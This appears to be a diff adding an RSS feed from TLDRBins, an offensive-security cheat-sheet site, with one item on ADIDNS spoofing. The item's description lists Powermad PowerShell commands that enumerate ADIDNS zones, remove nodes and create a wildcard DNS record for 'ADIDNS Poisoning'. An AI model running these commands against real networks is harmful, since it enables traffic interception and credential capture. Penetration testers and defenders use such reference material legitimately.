@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Spoofing on TLDRBins</title>
+    <link>https://tldrbins.github.io/@spoofing/</link>
+    <description>Recent content in Spoofing on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@spoofing/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ADIDNS</title>
+      <link>https://tldrbins.github.io/adidns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adidns/</guid>
+      <description>Basic Windows 1. Import Module . .\Powermad.ps1 2. Enum # Get ADIDNS Zone Get-ADIDNSZone # Get ADIDNS Permissions Get-ADIDNSPermission # Remove a Node Remove-ADIDNSNode -Node * Abuse #1: ADIDNS Poisoning Windows 1. Import Module . .\Powermad.ps1 2. Create a New Node $dnsRecord = New-DNSRecordArray -Type A -Data &amp;lt;LOCAL_IP&amp;gt; New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose 3. Check Resolve-DnsName DoesNotExist </description>
+    </item>
+  </channel>
+</rss>
